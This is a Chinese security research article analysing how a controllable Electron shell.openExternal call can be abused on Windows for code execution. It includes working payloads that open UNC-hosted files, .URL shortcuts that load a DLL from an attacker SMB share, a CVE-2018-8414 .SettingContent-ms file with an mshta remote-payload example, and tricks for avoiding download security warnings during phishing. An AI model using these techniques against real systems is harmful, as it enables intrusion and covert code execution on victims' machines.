> 原文链接: https://www.anquanke.com//post/id/251224 


# Electron的openExternal可控利用点分析


                                阅读量   
                                **65828**
                            
                        |
                        
                                                                                    



[![](https://p2.ssl.qhimg.com/t01b393aa3d835b1af2.png)](https://p2.ssl.qhimg.com/t01b393aa3d835b1af2.png)



作者：rv0p111 &amp; Wfox

## 一、前言

最近一直在进行有关Electron的研究，写这篇文章的目的主要是想记录针对Electron应用的一些攻击面研究。

在常见的Electron应用攻击场景中，基于XSS漏洞的进一步利用，但由于nodeIntegration限制无法require引用模块执行系统命令。在业务场景中的preload.js可能会暴露一些攻击面，业务中通过ipcMain监听主进程事件，render可通过ipcRenderer调用主进程的监听事件，调用实现上可能存在一些攻击点。

Electron在默认禁用nodeIntegration参数的情况下，render网页想要调用Electron主进程功能，一般是preload方式预先暴露一些electron模块在网页上下文中。例如如下业务代码中，preload.js在网页中注册了window.Bridge对象，其中包含了ipcRenderer、clipboard模块。

```
const `{` ipcRenderer `}` = require('electron');
const `{` bridgeEvtKey, picEvtKey`}` = require('../config.js');
const `{` cpImgExtRegx, getClipboardPaths, getClipboardFiles`}` = require('../component/util.js');

// WEB 与主程序桥接
window.ccBridge = `{`
    picEvtKey,
    uniqueId: 1,
    ipcRenderer,
    bridgeEvtKey,

    send(type, data) `{`
        const `{` callbackId `}` = this;

        return new Promise((resolve) =&gt; `{`

            ipcRenderer.on(callbackId, (event, arg) =&gt; `{`
                resolve(arg);
            `}`);
            // 渲染进程发送指令给主进程
            ipcRenderer.send(bridgeEvtKey, `{`
                type,
                data,
                callbackId,
            `}`);
        `}`);
    `}`,
    // 渲染线程方法
    get callbackId() `{`
        return 'cb_' + this.uniqueId++ + '_' + new Date().getTime();
    `}`,
    cpImgExtRegx,
    getClipboardPaths,
    getClipboardFiles,
`}`;
```

Electron在main.js中监听ipcMain事件并应答网页传递的ipcRenderer指令，其中openUrl事件可以调用shell.openExternal方法，从而可以调用系统打开URL，但没法直接利用拿到shell权限。

```
class Bridge `{`

    constructor(main) `{`
        this.uniqueId = 1;
        this.main = main;
        ipcMain.on(bridgeEvtKey, async (`{` reply `}`, `{` type, data, callbackId `}`) =&gt; `{`
            let res = null;
            const fun = this[type];
            if (typeof fun === 'function') `{`
                res = await fun.call(this, data);
            `}`
            reply(callbackId, res);
        `}`);
    `}`
    //提供了openUrl方法
    openUrl(url) `{`
        return shell.openExternal(url);

    `}`
`}`
```

本文以上述业务场景作为切入点，针对shell.openExternal打开外部链接的利用进行深入研究，梳理了多个windows上利用的攻击面。



## 二、演示环境

为了方便大家理解，这里以调用shell.openExternal的demo代码为例模拟XSS触发过程

```
&lt;!DOCTYPE html&gt;
&lt;html&gt;
  &lt;head&gt;
    &lt;meta charset="UTF-8"&gt;
    &lt;title&gt;Hello World!&lt;/title&gt;
  &lt;/head&gt;
  &lt;body&gt;
    &lt;h1&gt;Hello World!&lt;/h1&gt;
    node 当前使用的node为&lt;script&gt;document.write(process.versions.node)&lt;/script&gt;,
    Chrome 为&lt;script&gt;document.write(process.versions.chrome)&lt;/script&gt;,
    和 Electron 为&lt;script&gt;document.write(process.versions.electron)&lt;/script&gt;.
    &lt;script&gt;window.eval("const `{`shell`}` = require('electron');shell.openExternal('file:///');");&lt;/script&gt;
  &lt;/body&gt;
&lt;/html&gt;
```



## 三、利用研究

### <a class="reference-link" name="1.%20%E6%96%87%E4%BB%B6%E5%8F%AF%E8%90%BD%E5%9C%B0%E7%9A%84%E5%88%A9%E7%94%A8"></a>1. 文件可落地的利用

文件可落地利用方式主要用于我们在进行im钓鱼或者其他可落地文件的攻击方式时，可以利用该方式诱导用户下载文件，配合Electron应用有一个可控的JS代码执行点组合可以造成RCE(前提路径可知)

shell.openExternal可以直接通过windows系统打开该文件后缀对应的默认程序，比如说exe、jar、py等格式。

**EXE方式**

```
const `{`shell`}` = require('electron');shell.openExternal('file:///C:/Windows/System32/cmd.exe');
```

通过Electron调用shell.openExternal打开`file:///C:/Windows/System32/cmd.exe`，可以正常打开cmd.exe且无弹窗询问，但其实这跟应用程序的签名/下载方式/是否具备ads流等都有关系，下面会详细描述这个问题

[![](https://p2.ssl.qhimg.com/t01d63da8b86fdad1cb.png)](https://p2.ssl.qhimg.com/t01d63da8b86fdad1cb.png)

**Jar包方式/Py方式**

jar包和py文件在具备相关环境的情况下，可以直接执行，不会有弹框警告问题，虽然通过浏览器下载的jar包里面也含有ads流

[![](https://p4.ssl.qhimg.com/t014747c925bc420854.png)](https://p4.ssl.qhimg.com/t014747c925bc420854.png)

样例代码：

```
const `{`shell`}` = require('electron');shell.openExternal('file:///C:/Users/xxxx/Downloads/burpsuite_community.jar');
const `{`shell`}` = require('electron');shell.openExternal('file:///C:/Users/xxxx/Downloads/test.py');
```

[![](https://p0.ssl.qhimg.com/t01f5e8e984ccfaaccc.png)](https://p0.ssl.qhimg.com/t01f5e8e984ccfaaccc.png)

[![](https://p5.ssl.qhimg.com/t019bc559da0f1db91a.png)](https://p5.ssl.qhimg.com/t019bc559da0f1db91a.png)

### <a class="reference-link" name="2.%20%E6%96%87%E4%BB%B6%E4%BF%A1%E4%BB%BB%E6%9C%BA%E5%88%B6%E7%A0%94%E7%A9%B6"></a>2. 文件信任机制研究

对于打开exe、vbs等文件来说会存在一个问题，如果我们在浏览器通过http/https去下载它之后，双击它会出现一个安全警告的问题，原因是随着XP SP2的出现，当一个文件从互联网(即通过点击浏览器中的链接)下载到NTFS卷时，同时会在同目录下创建一个ADS数据流(Zone.Identifier)文件，比如test.exe对应的文件为`test.exe:zone.identifier`。该文件的内容被Windows 用作安全数据，以确定文件的发布者/源，所以如果我们打开不受信任的下载文件时会出现下面的问题，打开文件时弹出了一个安全警告框

[![](https://p1.ssl.qhimg.com/t012dafdda69fd9bfdc.png)](https://p1.ssl.qhimg.com/t012dafdda69fd9bfdc.png)

这里从浏览器下载的test.exe举例子，通过浏览器下载文件后同时会出现一个ADS数据流文件

[![](https://p1.ssl.qhimg.com/t01a072a4b3ada9a458.png)](https://p1.ssl.qhimg.com/t01a072a4b3ada9a458.png)

我们可以用notepad去查看数据流的内容，可以看到里面记录了相关的文件下载地址和referrer地址，那么这个信息是否可以作为在主机上发现了.URL可疑文件的时候的一个信息收集的点？

[![](https://p4.ssl.qhimg.com/t01204a6ac30b79d4e5.png)](https://p4.ssl.qhimg.com/t01204a6ac30b79d4e5.png)

其中ZoneId为3表示的是从互联网下载的

```
0 —— URLZONE_LOCAL_MACHINE（本地）
1 —— URLZONE_INTRANNET（内网）
2 —— URLZONE_TRUSTED（可信位置）
3 —— URLZONE_INTERNET（互联网）
4 —— URLZONE_UNTRUSTED（不可信位置）
```

下载文件被标识的内容跟IE的配置有关，准确的说是和注册表配置是有关的，下面会详细的阐述文件信任问题的发现过程。

在Internet区域(URLZONE_INTERNE)中，安全级别(中)的`加载应用程序和不安全文件`的默认配置是`提示`，所以通过浏览器下载的不安全的文件会弹出安全警告，如果将`提示`改为`启用`，那么就不会有安全警告的问题。

[![](https://p4.ssl.qhimg.com/t0172b0ade0580806ad.png)](https://p4.ssl.qhimg.com/t0172b0ade0580806ad.png)

1) 如果将[http://127.0.0.1](http://127.0.0.1) 添加进本地Intranet域中，这个时候再去下载test.exe，可以发现并不会创建ADS数据流文件。

[![](https://p3.ssl.qhimg.com/t01208b7557b6e4dd73.png)](https://p3.ssl.qhimg.com/t01208b7557b6e4dd73.png)

[![](https://p5.ssl.qhimg.com/t0155bf888249153e30.png)](https://p5.ssl.qhimg.com/t0155bf888249153e30.png)

再去调用shell.openExternal的时候会发现没有安全警告提示了，可以直接打开test.exe

```
const `{`shell`}` = require('electron');shell.openExternal('file:///C:/Users/xxxx/Downloads/test.exe');
```

[![](https://p2.ssl.qhimg.com/t01477e0c1b32f692ec.png)](https://p2.ssl.qhimg.com/t01477e0c1b32f692ec.png)

2) 如果我们在受信任的站点区域添加[http://127.0.0.1](http://127.0.0.1) ，默认情况下该区域的安全等级默认为中

[![](https://p2.ssl.qhimg.com/t013fb888d07a83c80f.png)](https://p2.ssl.qhimg.com/t013fb888d07a83c80f.png)

还是会产生ADS数据流文件，但是这里的ZoneId变成了2，表示为可信位置

[![](https://p0.ssl.qhimg.com/t01386241126bf146b2.png)](https://p0.ssl.qhimg.com/t01386241126bf146b2.png)

所以下载的应用程序不会弹出安全警告，可以直接打开exe文件

[![](https://p3.ssl.qhimg.com/t0104d4e63a35935769.png)](https://p3.ssl.qhimg.com/t0104d4e63a35935769.png)

3) 如果将[http://127.0.0.1](http://127.0.0.1) 设置为受限制的站点

[![](https://p2.ssl.qhimg.com/t0167a421b0d4994942.png)](https://p2.ssl.qhimg.com/t0167a421b0d4994942.png)

那么从该站点就无法下载到文件，会显示当前的安全设置不允许下载该文件

[![](https://p4.ssl.qhimg.com/t01c7010c32e86a83d7.png)](https://p4.ssl.qhimg.com/t01c7010c32e86a83d7.png)

谷歌浏览器会出现失败已禁止下载的情况

[![](https://p2.ssl.qhimg.com/t0116bcdfcc99cbbe72.png)](https://p2.ssl.qhimg.com/t0116bcdfcc99cbbe72.png)

上面经过研究我们通过IE浏览器对网站的信任配置差异对比，对注册表的操作可以在下图中找到答案，下面是我对ie浏览器的本地Intranet配置[https://www.msn.com](https://www.msn.com/)的结果

[![](https://p2.ssl.qhimg.com/t01b6103328f2e589b0.png)](https://p2.ssl.qhimg.com/t01b6103328f2e589b0.png)

如果我们设置的是domain，那么就会在计算机\HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\Domains\进行配置，因为受信任的站点的zoneTransfer为2，所以下面的https也就为2

[![](https://p3.ssl.qhimg.com/t01e60b97a9280330c6.png)](https://p3.ssl.qhimg.com/t01e60b97a9280330c6.png)

如果我们配置的是ip地址那么就会在计算机\HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\Ranges当中进行配置，其中https后面的值代表的就是ZoneTransfer的值，其实也就是/HKEY_CURRENT_USER/SoftWare/Microsoft/Windows/CurrentVersion/Internet Settings/ZoneMap/Ranges下有一个信任站点就有一个RangeN（N为1,2,3…）的记录

[![](https://p4.ssl.qhimg.com/t012ad43ac7b1e5b649.png)](https://p4.ssl.qhimg.com/t012ad43ac7b1e5b649.png)

所以应用程序是否会具备风险警告其实是和我们注册表配置有关，下载的程序的站点在受信任的站点当中，点击之后就不会有警告信息

如果不是通过浏览器下载得到的文件，而是通过一些命令行工具例如powershell的方式进行下载，那么得到的文件就不会含有ads流，打开文件也就不会存在信任警告问题，以下介绍仅为研究什么情况下会弹框的实践成果

```
$client = new-object System.Net.WebClient
$client.DownloadFile('https://oss/download/cmd.exe','C:\Users\xxxx\Desktop\cmd.exe')
```

[![](https://p0.ssl.qhimg.com/t0133f9f3d2f2f41fc4.png)](https://p0.ssl.qhimg.com/t0133f9f3d2f2f41fc4.png)

还有如果把exe文件包装在压缩包内，然后用户解压压缩包，压缩包里面的文件不会被附加上ads流，所以点击执行也同样不会有弹框信任这个问题

[![](https://p0.ssl.qhimg.com/t018c67722e3849362b.png)](https://p0.ssl.qhimg.com/t018c67722e3849362b.png)

[![](https://p0.ssl.qhimg.com/t0108bc2bf0a43c4c60.png)](https://p0.ssl.qhimg.com/t0108bc2bf0a43c4c60.png)

[![](https://p1.ssl.qhimg.com/t0198d322641208581e.png)](https://p1.ssl.qhimg.com/t0198d322641208581e.png)

如果应用程序自带有效的证书签名，虽然其本身也带有ADS数据流也带有URLZONE_INTERNET的标识，但是打开文件时也不会出现弹框警告

[![](https://p2.ssl.qhimg.com/t01adddcecb0176bced.png)](https://p2.ssl.qhimg.com/t01adddcecb0176bced.png)

[![](https://p2.ssl.qhimg.com/t01a51e4e2a9048a800.png)](https://p2.ssl.qhimg.com/t01a51e4e2a9048a800.png)

在实战攻击场景中，我们可能遇到以下场景导致无法利用，在经过研究之后发现可通过远程加载的方式进行攻击。
- 我们可控某个应用漏洞允许执行本地文件，但是无法附加任何参数
- 或者说如果通过钓鱼的方式让对方下载了exe，但是我们有个某客户端应用的rce漏洞可以打开文件，但是会出现由于信任机制导致的弹框问题，需要用户点击确认才可以执行，有没有什么方法可以替代这个让用户警觉的过程
- exe无法落地
### <a class="reference-link" name="3.%20%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8A%A0%E8%BD%BD%E5%88%A9%E7%94%A8"></a>3. 远程文件加载利用

**<a class="reference-link" name="3.1%20UNC%E6%96%B9%E5%BC%8F"></a>3.1 UNC方式**

通过unc方式加载可以使文件不落地远程唤起文件执行，但是如果指定打开一个exe文件还是会存在一个弹框警告，对于在渗透过程中为了尽可能减少对方的感知来说显然是不够的，所以在后面会叙述下如何绕过这个弹框

当我们用unc的方式去指定让其去打开smb共享里面的exe文件(不带ads流),但是依然会有安全警告问题

```
const `{`shell`}` = require('electron');shell.openExternal('file://127.0.0.1/C$/Windows/System32/cmd.exe');
```

[![](https://p4.ssl.qhimg.com/t0186330957060e4cd0.png)](https://p4.ssl.qhimg.com/t0186330957060e4cd0.png)

通过smb打开jar/py文件却是不会有任何警告的，情况和文件落地时的情况类似就不再多加叙述

```
//jar包方式
const `{`shell`}` = require('electron');shell.openExternal('file://127.0.0.1/C$/Users/xxxx/Desktop/burpsuite_community.jar');
//py方式
const `{`shell`}` = require('electron');shell.openExternal('file://127.0.0.1/C$/Users/xxxx/Desktop/test.py');
```

但是这一切的一切都有个前提，对方具有python或者java环境，那如果是这些环境都没有呢？有没有什么比较好的替代方法？

<a class="reference-link" name="3.2%20UNC%20+%20URL%E6%96%B9%E5%BC%8F"></a>**3.2 UNC + URL方式**

这里我们创建了一个test.URL文件来演示这个过程，test.URL如下所示，需要注意的就是两个参数URL和WorkingDirectory，首先我们先设置URL指定为本地的exe，在这一小节中WorkingDirectory在这里不是重点

```
[InternetShortcut]
URL=file:///C:/windows/system32/cmd.exe
WorkingDirectory=\\127.0.0.1\C$
```

通过shell.openExternal打开远程smb服务器中的.url文件

```
const `{`shell`}` = require('electron');shell.openExternal('file://127.0.0.1/C$/Users/xxxx/Desktop/test.url');
```

可以直接打开cmd窗口，不会存在警告问题，但是这里可能有人会说了，你这样只能打开落地的cmd.exe，或者说还是没有解决不落地打开exe的效果

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01d46952d28ac34495.png)

那我们再测试下如果在URL文件当中引用远程的exe程序会产生什么样的效果，test.URL配置如下所示

```
[InternetShortcut]
URL=file://127.0.0.1/C$/Windows/System32/cmd.exe
WorkingDirectory=\\127.0.0.1\C$\temp\
```

然后再用electron的openExternal打开它，发现还是会存在安全警告问题

[![](https://p0.ssl.qhimg.com/t01c3f76c1507075bd4.png)](https://p0.ssl.qhimg.com/t01c3f76c1507075bd4.png)

<a class="reference-link" name="3.3%20UNC%20+%20URL%20+%20DLL%E5%8A%AB%E6%8C%81%E6%96%B9%E5%BC%8F"></a>**3.3 UNC + URL + DLL劫持方式**

为了解决上面存在的问题，介绍下之前看到的通过url+dll劫持的方式进行绕过的方式，我们通过在URL当中指定在windows下存在dll缺陷的exe应用程序，然后我们将workDirectory指定为可控的smb共享目录，这样在受害者打开我们的URL文件的URL标签中指定的文件时候，会去通过我们设定的workDirectory目录去寻找相关的dll，这个时候只需要将我们的dll放入我们设定的smb共享目录中就可以实现一个恶意dll的加载，URL内容如下所示

```
[InternetShortcut]
URL=file:///C:/Windows/WinSxS/amd64_netfx-mscorsvw_exe_b03f5f7f11d50a3a_10.0.19041.1_none_99318cb064fcaf44/mscorsvw.exe
WorkingDirectory=\\127.0.0.1\C$\temp\
```

在这里可以看到mscorsvw.exe成功的去加载了我们的smb共享里的dll

[![](https://p4.ssl.qhimg.com/t019969c414965b251a.png)](https://p4.ssl.qhimg.com/t019969c414965b251a.png)

这是因为C:/Windows/WinSxS/amd64_netfx-mscorsvw_exe_b03f5f7f11d50a3a_10.0.19041.1_none_99318cb064fcaf44目录下没有mscorsvc.dll，所以会去我们指定的工作目录去加载

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01e9f34100f0442576.png)

总结来说上述的方案可以适用于
1. 易受攻击的应用程序允许执行文件但没有参数
<li>可以滥用这个漏洞来加载 `file://attacker/SmbShare/random.URL`
</li>
1. evil.URL的结构如上述所说，找到存在dll劫持的应用程序写在URL当中，workDirectory指定为可控的smb共享目录
1. exe加载时由于缺少dll会从远程加载dll导致任意代码执行
<a class="reference-link" name="3.4%20SettingContent-ms%E7%9A%84%E6%96%B9%E5%BC%8F"></a>**3.4 SettingContent-ms的方式**

```
当然除了上述叙说的URL形式，在没有打补丁的情况，我们还可以借用CVE\-2018\-8414 SettingContent\-ms的方式进行利用，出现这个漏洞的原因简单来说就是Windows 10下执行.SettingContent\-ms后缀的文件，系统并未判断该类文件所在的路径是否在控制面板相关目录下，便直接执行了文件中用于控制面板设置相关的DeepLink标签指定的任意程序，导致用户执行系统任意目录下的此类文件或者从网络上下载的经过精心设计的.SettingContent\-ms文件也会直接执行其中指定的恶意程序对象，导致任意代码执行。
```

```
const `{`shell`}` = require('electron');shell.openExternal('file://10.1.1.1/C$/share/test.SettingContent.ms');
```

test.SettingContent.ms的文件内容

```
&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;PCSettings&gt;
  &lt;SearchableContent xmlns="http://schemas.microsoft.com/Search/2013/SettingContent"&gt;
    &lt;ApplicationInformation&gt;
      &lt;AppID&gt;windows.immersivecontrolpanel_cw5n1h2txyewy!microsoft.windows.immersivecontrolpanel&lt;/AppID&gt;
      //example:mshta https://1.1.1.1/kkk.hta
      &lt;DeepLink&gt;%windir%\system32\cmd.exe /c calc.exe&lt;/DeepLink&gt;
      &lt;Icon&gt;%windir%\system32\control.exe&lt;/Icon&gt;
    &lt;/ApplicationInformation&gt;
    &lt;SettingIdentity&gt;
      &lt;PageID&gt;&lt;/PageID&gt;
      &lt;HostID&gt;`{`12B1697E-D3A0-4DBC-B568-CCF64A3F934D`}`&lt;/HostID&gt;
    &lt;/SettingIdentity&gt;
    &lt;SettingInformation&gt;
      &lt;Description&gt;@shell32.dll,-4161&lt;/Description&gt;
      &lt;Keywords&gt;@shell32.dll,-4161&lt;/Keywords&gt;
    &lt;/SettingInformation&gt;
  &lt;/SearchableContent&gt;
&lt;/PCSettings&gt;
```

微软对该漏洞发布的补丁程序对执行路径做了判断，只有在%AppData%\Local\Packages\windows.immersivecontrolpanel_cw5n1h2txyewy\LocalState\Indexed\Settings\[GetUserPreferredUILanguages]或%WinDir%\immersivecontrolpanel\settings子目录内打开SettingContent-ms后缀文件才能进入执行控制面板设置分支执行命令，所以如果我们在打了补丁的电脑上进行利用没有放在指定的文件夹，可能会出现下面的报错

[![](https://p3.ssl.qhimg.com/t01a069fb20b3e20d20.png)](https://p3.ssl.qhimg.com/t01a069fb20b3e20d20.png)

所以极大程序上限制了我们的利用，在打了补丁的电脑中，已经获取权限的情况下，可以这么利用网上的一款公开的工具scmwrap进行配置.SettingContent-ms后缀文件的打开方式，利用.SettingContent-ms的因为我们还是可以利用unc路径指向它进行执行，而且不会出现安全警告问题，并且其deeplink支持传递参数，这样后续在具备openExternal可控点的情况下只需要远程指定一个.SettingContent-ms执行就可以实现rce，例如deeplink内容为调用mshta下载远程payload执行

scmwrap工具安装配置的就是下面的内容

```
ASSOC .SettingContent-ms = NewSettingContentMs
FTYPE NewSettingContentMs="C:\Users\xxxx\Desktop\scmwrap.exe" "%1"
```

scmwrap.exe的解析原理使用的是xml解析，然后获取DeepLink参数进行执行

```
ShowWindow(GetConsoleWindow(), SW_HIDE);

XmlDocument XmlDoc = new XmlDocument();

XmlDoc.Load(args[0]);

bool FoundDeepLink = false;

XmlNodeList Nodes = XmlDoc.GetElementsByTagName("DeepLink");
for (int i = 0; i &lt;= Nodes.Count - 1; i++) `{`
    ShellExecute(0, "open", "cmd.exe", "/C " + Nodes[i].InnerText.Replace("\n", "").Replace("\r", ""), "", 0);

    Console.WriteLine("Call: " + Nodes[i].InnerText.Replace("\n", "").Replace("\r", ""));

    FoundDeepLink = true;
`}`

if (!FoundDeepLink) `{`
    Console.WriteLine("No deep link found");
`}`

Console.ReadLine();
```

所以只要我们设置了.SettingContent-ms的执行方式，那么我们就可以在任意目录双击打开它了，因为它本质上就是配置了如下内容

[![](https://p2.ssl.qhimg.com/t012fa3a5c490055934.png)](https://p2.ssl.qhimg.com/t012fa3a5c490055934.png)

桌面直接执行

[![](https://p4.ssl.qhimg.com/t01db8ce2311aba778f.png)](https://p4.ssl.qhimg.com/t01db8ce2311aba778f.png)



## 四、参考链接

[https://blog.csdn.net/wangqiulin123456/article/details/17068649](https://blog.csdn.net/wangqiulin123456/article/details/17068649)

[https://github.com/joesecurity/scmwrap](https://github.com/joesecurity/scmwrap)
